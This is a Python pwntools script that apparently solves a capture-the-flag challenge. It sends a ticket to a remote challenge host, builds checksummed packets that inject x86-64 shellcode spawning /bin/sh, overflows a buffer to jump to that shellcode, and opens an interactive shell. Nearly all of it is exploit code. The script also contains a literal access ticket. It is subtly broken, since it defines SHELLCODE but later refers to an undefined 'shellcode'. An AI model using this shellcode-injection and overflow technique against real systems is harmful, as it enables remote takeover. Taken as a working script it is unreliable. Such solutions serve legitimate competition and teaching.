#!/usr/bin/env python3

from struct import pack

from pwn import *

SHELLCODE = (
    b"/bin/sh\x00"  # /bin/sh string
    + b"\x90" * 10  # NOP sled
    + b"\x50\x48\x31\xD2\x48\x31\xF6\x48\xC7\xC7\x00\x00\x80\x12\xB0\x3B\x0F\x05"  # shellcode
)

# Make packet given payload and function indices
def make_pkt(data, i1, i2):

    # Use the C binary to calculate the checksum
    with open("data", "wb") as f:
        f.write(data)
    p = process("./a.out")  # need to compile with gcc solve.c
    checksum = int(p.recvall())

    # Construct the packet
    return (
        b"\x55\xaa" + pack("<HH", len(data), checksum & 0xFFFF) + bytes([i1, i2]) + data
    )


# Present the ticket to start the netcat service
r = remote("wealthy-rock.satellitesabove.me", 5010)
r.recvuntil("please:\n")
r.sendline(
    "ticket{yankee230465kilo2:GOXOTiujvyvg-fYdRA94sL6rsfwuYSAmLSPBWh452Z94Olps-sWn5paLskDwEcSXMw}"
)
resp = r.recvrepeat(5).decode().split("tcp:")[1].split("\n")[0]
host, port = resp.split(":")

# Connect to the service (or local binary)
p = remote(host, int(port))
# p = process("./challenge")

# Send the packet to insert the shellcode
data = pack("<HH", 0, len(shellcode))
p.send(make_pkt(data + shellcode, 2, 1))

# Send the exploit and start an interactive session
p.send(make_pkt(b"A" * 20 + p64(0x12800010), 1, 1))
p.interactive()
